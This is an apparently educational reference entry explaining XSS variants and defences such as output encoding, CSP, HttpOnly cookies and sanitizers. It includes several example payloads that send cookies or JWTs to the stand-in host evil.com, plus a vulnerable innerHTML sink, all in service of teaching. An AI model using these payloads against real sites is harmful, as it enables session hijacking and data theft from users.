# 241 — XSS (Cross-Site Scripting)

⚡ TL;DR — XSS is a code injection attack where an attacker injects malicious JavaScript into a trusted website, which then executes in victims' browsers with the site's full privileges — allowing cookie theft, session hijacking, DOM manipulation, and data exfiltration; prevented by output encoding, Content Security Policy (CSP), and HttpOnly cookies.

### 🔥 The Problem This Solves (The Threat)

**THE ATTACK:**
An e-commerce site displays user-submitted product reviews without sanitizing HTML.
Attacker submits a review containing:
`Great product! <script>fetch('https://evil.com/steal?c='+document.cookie)</script>`

The site stores this raw HTML in the database and renders it on the product page.
Every visitor who views that product page has their session cookie sent to evil.com.
The attacker collects these cookies, uses them to impersonate victims, checks out
with their saved payment methods.

**WHY IT'S DANGEROUS:**
The injected script runs in the victim's browser with the FULL trust of the legitimate
website. Same-Origin Policy doesn't protect here — the script IS on the trusted origin.
It can: read cookies, localStorage, sessionStorage; make authenticated API calls as
the victim; modify page DOM; capture keystrokes (credential harvesting); redirect to phishing pages.

---

### 📘 Textbook Definition

**Cross-Site Scripting (XSS)** is a client-side injection vulnerability (OWASP Top 10 #3)
in which an attacker injects malicious JavaScript into a web page that other users view.
The injected script executes in victims' browsers within the security context of the
legitimate site, bypassing the Same-Origin Policy. XSS has three variants:
**Stored/Persistent XSS** (malicious payload stored in DB, served to all viewers),
**Reflected XSS** (payload in URL/form, reflected immediately in response — requires
tricking victim to visit crafted URL), and **DOM-based XSS** (payload processed by
JavaScript on the page without server involvement — `innerHTML`, `document.write`,
`eval` with untrusted data). Prevention requires: HTML output encoding (escape `<>'"&`),
Content Security Policy (CSP), input validation, and HttpOnly + Secure cookie flags.

---

### ⏱️ Understand It in 30 Seconds

**One line:**
XSS = attacker's JavaScript executing in a victim's browser as if it were YOUR website's
JavaScript — with all of your site's cookies, storage, and API access.

**One analogy:**

> XSS is like a food tampering attack at a restaurant. The evil chef (attacker)
> substitutes a dish in the kitchen (injects malicious script into the database).
> When the legitimate waiter (web server) serves it to customers (users), the
> tampered food (malicious script) harms them. Customers trust the restaurant
> (the origin) so they "consume" the data without suspicion.

**One insight:**
XSS attacks the BROWSER TRUST MODEL. The browser trusts scripts from an origin because
they're assumed to come from the legitimate site owner. XSS lets an attacker plant
malicious scripts that GET that trust — because the browser can't distinguish legitimate
vs injected scripts once they're in the page from the trusted origin.

### 🔩 First Principles Explanation

**THREE XSS VARIANTS:**

```
TYPE 1 — STORED XSS (most dangerous)
  1. Attacker submits payload to server: comment, profile field, message
  2. Server stores raw HTML/JS in database (no sanitization)
  3. Server renders it back to every user who visits the page
  4. Every visitor's browser executes attacker's script

  Example:
  Input: <img src="x" onerror="document.location='https://evil.com/?c='+document.cookie">
  DB stores: exactly this string
  Page renders: this as raw HTML → every visitor's browser fetches evil.com with their cookie

TYPE 2 — REFLECTED XSS
  1. Attacker crafts a URL containing a script:
     https://shop.com/search?q=<script>fetch('//evil.com?c='+document.cookie)</script>
  2. Attacker tricks victim into clicking the link
  3. Server takes q= parameter and reflects it in the response HTML without encoding
  4. Victim's browser executes script (single visit, not stored)

  Why it's still dangerous:
  - Phishing email: "Click here for your refund: [crafted URL]"
  - URL shortener hides the script content
  - Only ONE victim needs to click (no mass storage)

TYPE 3 — DOM-BASED XSS (client-side only)
  Server sends a "safe" response.
  But JavaScript on the page processes untrusted data unsafely:

  // VULNERABLE:
  const query = new URLSearchParams(location.search).get('q');
  document.getElementById('result').innerHTML = query;  // ← DANGEROUS: raw HTML insertion

  Payload URL: /search?q=<img onerror=alert(1) src=x>
  No server involvement needed — browser's own JS does the damage
  Hard to catch with server-side input validation alone

SINK LOCATIONS (DOM XSS):
  innerHTML = untrusted  ← #1 cause
  document.write(untrusted)
  eval(untrusted)
  setTimeout(untrusted_string)
  location.href = untrusted  ← open redirect + XSS
  outerHTML = untrusted
```

**WHY ENCODING MATTERS:**

```
INSECURE — raw output:
  template: <div>${userComment}</div>
  user input: <script>alert(1)</script>
  rendered: <div><script>alert(1)</script></div> → EXECUTES

SECURE — HTML entity encoding:
  template: <div>${htmlEncode(userComment)}</div>
  user input: <script>alert(1)</script>
  rendered: <div>&lt;script&gt;alert(1)&lt;/script&gt;</div> → SAFE TEXT

ENCODING CHART:
  & → &amp;   (first! otherwise double-encoding)
  < → &lt;
  > → &gt;
  " → &quot;
  ' → &#x27;  (or &apos; in HTML5)
  / → &#x2F;  (closes script tags or HTML attribute delimiters)
```

### 🧪 Thought Experiment

**SCENARIO:** Impact of XSS + localStorage vulnerability.

```
Modern SPA stores JWT in localStorage:
  localStorage.setItem('token', 'eyJhbGci...');
  fetch('/api/data', { headers: { Authorization: 'Bearer ' + localStorage.getItem('token') } })

XSS attack:
  Attacker injects: <script>
    fetch('https://evil.com/steal?t=' + localStorage.getItem('token'));
  </script>

Impact:
  Victim's browser executes → localStorage['token'] (JWT) sent to attacker
  JWT is valid for 15 minutes + renewable with refresh token
  Attacker has persistent access until JWT and refresh token expire

If token was in HttpOnly cookie instead:
  XSS attack: <script>
    fetch('https://evil.com/steal?c=' + document.cookie)
  </script>
  document.cookie does NOT include HttpOnly cookies
  → Attacker gets only non-HttpOnly cookies (often empty) → token NOT stolen

Lesson:
  HttpOnly cookies protect tokens from XSS exfiltration
  XSS attacker can still MAKE authenticated API calls using the browser's cookies
  (cookies are automatically sent with same-origin requests even from injected scripts)
  But they can't exfiltrate the token itself for use outside the browser
  → Short JWT expiry + CSRF protection + CSP → layered defense
```

### 🧠 Mental Model / Analogy

> XSS is like forging a letter on official government letterhead.
> The recipient (browser) trusts the letterhead (origin), not the content author.
> If an attacker can insert their message onto your letterhead (inject into your page),
> the recipient will trust and act on that message.
>
> Defense: use a printing system that automatically sanitizes content (output encoding)
> before it goes on the letterhead. Or: use a system that only accepts pre-approved
> letter formats (CSP: only run scripts from approved sources).

### 📶 Gradual Depth — Four Levels

**Level 1 — What it is (anyone can understand):**
XSS means an attacker sneaks JavaScript code into a website. When you visit the site,
that code runs in your browser pretending to be the legitimate site — and it can steal
your login cookies or do things as you without your knowledge.

**Level 2 — How to fix it (junior developer):**
Escape all user-controlled data before putting it in HTML (use encoding, not filtering).
Use modern frameworks (React, Vue) which escape HTML by default. Set `HttpOnly` and
`Secure` flags on session cookies (prevents JS from reading them). Add a Content Security
Policy header that restricts which scripts can run. Never use `innerHTML` with untrusted data — use `textContent` instead.

**Level 3 — How it works (mid-level engineer):**
Output encoding must match context: HTML body encoding differs from HTML attribute encoding
differs from JavaScript string encoding differs from URL encoding — context matters!
For example: `<a href="${userUrl}">click</a>` — if user submits `javascript:alert(1)`,
HTML encoding of `<>` doesn't help because `javascript:` URLs don't have those characters.
Need URL scheme validation (`startsWith('https://')`) for href values. CSP header:
`Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted-cdn.com` —
blocks inline scripts and external scripts from untrusted domains. Combine with
`script-src 'nonce-xxx'` for inline scripts that must be allowed.

**Level 4 — Why it's still prevalent (senior/staff):**
XSS persists because: (1) the rendering model (HTML mixes content and code) is
fundamentally insecure — no easy structural fix. (2) Context-dependent encoding
(HTML, JS, URL, CSS contexts all different) is easy to get wrong. (3) DOM-sinks
(`innerHTML`, `document.write`) remain in use in legacy code. (4) Third-party
JavaScript (analytics, chat widgets) from CDNs creates trusted XSS vectors even on
secure first-party code. The defense-in-depth approach: encode output + CSP + HttpOnly
cookies + short token expiry + WAF + subresource integrity (SRI) for third-party scripts.
Modern frameworks helped dramatically (React's auto-escaping), but dangerouslySetInnerHTML
and `v-html` remain escape hatches.

### ⚙️ How It Works (Mechanism)

```
STORED XSS FLOW:

┌────────────────────────────────────────────────────────────┐
│ ATTACKER                                                   │
│   POST /comments { body: "<script>document.location=..." } │
│                                                            │
│ DATABASE (stores unsanitized input)                        │
│   comments: [{ id:1, body: "<script>...</script>" }]       │
│                                                            │
│ VICTIM visits page                                         │
│   GET /product/42 → HTML includes:                        │
│   <div class="review">                                     │
│     <script>document.location='https://evil.com?c='       │
│      +document.cookie</script>                             │
│   </div>                                                   │
│                                                            │
│ VICTIM'S BROWSER                                           │
│   Parses HTML → encounters <script> → executes it          │
│   → fetch to evil.com with victim's cookies               │
│                                                            │
│ ATTACKER receives: GET https://evil.com?c=session=abc123  │
│   → uses session=abc123 to impersonate victim             │
└────────────────────────────────────────────────────────────┘
```

### 🔄 The Complete Picture — End-to-End Prevention

```
INPUT SIDE:
  Validate: reject clearly invalid input (empty, too long, wrong type)
  But: DO NOT rely on input filtering as XSS defense (encoding is the defense)

OUTPUT SIDE (defense-in-defense):
  - HTML context: HTML entity encode ALL user content
  - JS context: JSON encode or use safe DOM APIs (textContent)
  - URL context: URL encode + validate scheme for href values
  - CSS context: avoid dynamic CSS; CSS can execute JS in IE-era

INFRASTRUCTURE:
  - CSP header: block inline scripts + restrict script sources
  - HttpOnly + Secure + SameSite cookies: prevent cookie theft
  - WAF rules: detect common XSS patterns in transit (defense-in-depth, not primary)
  - SRI (Subresource Integrity): <script src="..." integrity="sha256-..."> for CDN scripts
```

### 💻 Code Example

```java
// Spring Boot / Thymeleaf — auto-encoding (safe by default)
// Thymeleaf: th:text = safe (HTML encoded). th:utext = UNSAFE (raw HTML, avoid).
// <span th:text="${userComment}">Comment here</span>  ← SAFE: auto-encoded

// MANUAL encoding if using direct string interpolation:
import org.springframework.web.util.HtmlUtils;

String safeComment = HtmlUtils.htmlEscape(userComment);
// "<script>..." → "&lt;script&gt;..."

// ContentSecurityPolicy header configuration:
@Configuration
public class SecurityHeadersConfig {
    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        http.headers(headers -> headers
            .contentSecurityPolicy(csp -> csp
                .policyDirectives(
                    "default-src 'self'; " +
                    "script-src 'self' https://cdn.trusted.com; " +
                    "style-src 'self' https://fonts.googleapis.com; " +
                    "img-src 'self' data: https:; " +
                    "connect-src 'self' https://api.company.com; " +
                    "frame-ancestors 'none'; " +   // clickjacking protection
                    "base-uri 'self'; " +
                    "form-action 'self'"
                ))
            // HttpOnly cookies: configured in application.properties
            // server.servlet.session.cookie.http-only=true
            // server.servlet.session.cookie.secure=true
            // server.servlet.session.cookie.same-site=Strict
        );
        return http.build();
    }
}
```

### ⚖️ Comparison Table

| XSS Type              | Stored?       | Trigger                   | Server Fixed By            | Client Fixed By                  |
| --------------------- | ------------- | ------------------------- | -------------------------- | -------------------------------- |
| **Stored/Persistent** | Yes (DB)      | Any visitor               | Output encoding on render  | CSP                              |
| **Reflected**         | No (URL/form) | Phishing link click       | Output encoding on reflect | CSP                              |
| **DOM-based**         | No            | URL param processed in JS | N/A (no server render)     | Use textContent; avoid innerHTML |

### ⚠️ Common Misconceptions

| Misconception                          | Reality                                                                                                                                                                            |
| -------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Input validation prevents XSS          | Input validation is a defense-in-depth layer, not the primary fix. Output encoding on render is the primary defense. Valid-looking input can still be XSS payload in some contexts |
| HttpOnly cookies prevent XSS           | HttpOnly prevents token theft via `document.cookie`. But injected JS can still MAKE requests using the browser's cookies — XSS still lets attackers act as the user                |
| React/Vue/Angular protects against XSS | Modern frameworks escape HTML by default, greatly reducing risk. But `dangerouslySetInnerHTML`, `v-html`, and direct DOM manipulation remain unsafe if used with untrusted content |
| CSP alone prevents XSS                 | CSP reduces impact (blocks script execution from injected inline scripts) but a bypass via allowed CDN, JSONP endpoint, or Angular template injection can still work               |

### 🚨 Failure Modes & Diagnosis

**Stored XSS via Rich Text Field**

**Symptom:**
Security scanner flags: stored XSS in user bio/description field.
Proof: submit `<script>alert(1)</script>` as bio → it executes for other users.

**Root Cause:**
Bio field allows "rich text" (HTML). Server stores raw HTML. Renderer uses {% raw %}`{{{bio}}}`{% endraw %} (raw HTML in Handlebars) or `th:utext` (raw in Thymeleaf) instead of safe encoded output.

Diagnostic / Fix:

```
# Test for stored XSS:
1. Submit bio: <script>alert(document.origin)</script>
2. Visit profile page in different browser
3. If alert fires: stored XSS confirmed

# Fix options (in priority order):
Option A: Convert rich text to plain text (if formatting not needed)
  → th:text/textContent → always safe

Option B: Allow only Markdown (no raw HTML)
  → Parse markdown server-side → safe HTML output with allow-list

Option C: Allow rich text, sanitize with allow-list library
  → Java: OWASP Java HTML Sanitizer
  → JavaScript: DOMPurify
  → Allow: <p>, <strong>, <em>, <a href> — block ALL <script>, <img onerror>, event handlers

# Always: implement CSP as defense-in-depth
# Report-only first: Content-Security-Policy-Report-Only: ... report-uri /csp-report
```

### 🔗 Related Keywords

- `CSRF` — a related but different attack not requiring script injection
- `Content Security Policy (CSP)` — the browser-enforced script execution policy that mitigates XSS impact
- `SQL Injection` — analogous injection attack targeting databases instead of browsers
- `HttpOnly Cookie` — the cookie attribute that limits XSS-driven cookie theft

**Q.** A security team discovers that a chat application has a stored XSS vulnerability that has been present in production for 4 months before discovery. Design the incident response plan: immediate containment (what can you do RIGHT NOW without a code deploy?), identify if the vulnerability was exploited (what evidence would exist in logs?), determine the scope of impact (which user sessions are compromised?), recovery (how do you invalidate all potentially stolen sessions?), and long-term remediation (beyond fixing the specific bug — what processes prevent the next XSS?).
